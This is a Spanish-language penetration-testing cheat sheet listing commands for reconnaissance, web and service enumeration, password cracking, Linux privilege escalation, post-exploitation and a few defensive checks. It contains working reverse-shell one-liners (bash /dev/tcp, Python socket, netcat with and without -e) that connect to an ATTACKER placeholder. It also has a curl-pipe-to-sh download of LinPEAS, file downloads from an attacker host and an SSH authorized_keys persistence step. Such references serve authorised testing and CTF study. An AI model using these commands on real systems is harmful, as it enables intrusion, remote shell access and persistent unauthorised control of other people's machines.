# Comandos Rapidos - Hacking

> Todo el contenido es para fines educativos, CTFs y pruebas de penetracion autorizadas.

## Reconocimiento

| Comando | Descripcion |
|---------|-------------|
| `nmap -sn 192.168.1.0/24` | Descubrimiento de hosts |
| `nmap -sV -sC -p- target` | Escaneo completo de puertos |
| `nmap -sU -p- target` | Escaneo UDP |
| `nmap --script vuln target` | Scripts de vulnerabilidades |
| `whois dominio` | Info de registro de dominio |
| `dig axfr dominio @ns` | Transferencia de zona DNS |
| `theHarvester -d dom -b all` | Recopilar emails/subdominios |

## Enumeracion web

| Comando | Descripcion |
|---------|-------------|
| `gobuster dir -u URL -w wordlist` | Fuerza bruta de directorios |
| `ffuf -u URL/FUZZ -w wordlist` | Fuzzing rapido |
| `nikto -h URL` | Escaneo de vulnerabilidades web |
| `wpscan --url URL` | Escaneo de WordPress |
| `whatweb URL` | Identificar tecnologias web |
| `curl -I URL` | Ver headers HTTP |

## Enumeracion de servicios

| Comando | Descripcion |
|---------|-------------|
| `enum4linux -a target` | Enumeracion SMB completa |
| `smbclient -N -L //target` | Listar shares anonimos |
| `rpcclient -U "" -N target` | RPC anonimo |
| `ldapsearch -x -h target -b "dc=dom,dc=com"` | Busqueda LDAP |
| `snmpwalk -c public target` | Enumeracion SNMP |
| `ftp target` | Verificar FTP anonimo |

## Explotacion

| Comando | Descripcion |
|---------|-------------|
| `msfconsole` | Iniciar Metasploit |
| `searchsploit termino` | Buscar exploits |
| `sqlmap -u "URL?id=1"` | Inyeccion SQL automatizada |
| `hydra -l user -P wordlist target ssh` | Fuerza bruta SSH |
| `john --wordlist=rockyou.txt hash` | Crackear hashes |
| `hashcat -m 0 hash wordlist` | Crackear hashes (GPU) |

## Reverse shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (con -e)
nc -e /bin/sh ATTACKER PORT

# Netcat (sin -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f
```

Listener:
```bash
nc -lvnp PORT
```

## Escalada de privilegios Linux

| Comando | Descripcion |
|---------|-------------|
| `sudo -l` | Listar permisos sudo |
| `find / -perm -4000 2>/dev/null` | Buscar binarios SUID |
| `find / -writable 2>/dev/null` | Buscar archivos escribibles |
| `cat /etc/crontab` | Ver tareas cron |
| `ls -la /etc/cron*` | Listar directorios cron |
| `getcap -r / 2>/dev/null` | Buscar capabilities |
| `cat /etc/passwd` | Usuarios del sistema |
| `env` | Variables de entorno |
| `uname -a` | Info del kernel (buscar exploits) |
| `id` | Usuario y grupos actuales |

Scripts automatizados:
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

## Post-explotacion

| Comando | Descripcion |
|---------|-------------|
| `python3 -m http.server 8000` | Servidor HTTP rapido |
| `wget http://attacker/file` | Descargar archivo |
| `curl http://attacker/file -o file` | Descargar archivo |
| `ssh-keygen && cat id_rsa.pub >> authorized_keys` | Persistencia SSH |

## Defensivo

| Comando | Descripcion |
|---------|-------------|
| `iptables -L -n -v` | Ver reglas de firewall |
| `ss -tulnp` | Puertos en escucha |
| `last` | Ultimos logins |
| `lastb` | Intentos fallidos de login |
| `who` | Usuarios conectados |
| `w` | Usuarios y que hacen |
| `rkhunter --check` | Buscar rootkits |
| `chkrootkit` | Buscar rootkits |
| `lynis audit system` | Auditoria de seguridad |
| `fail2ban-client status` | Estado de Fail2ban |
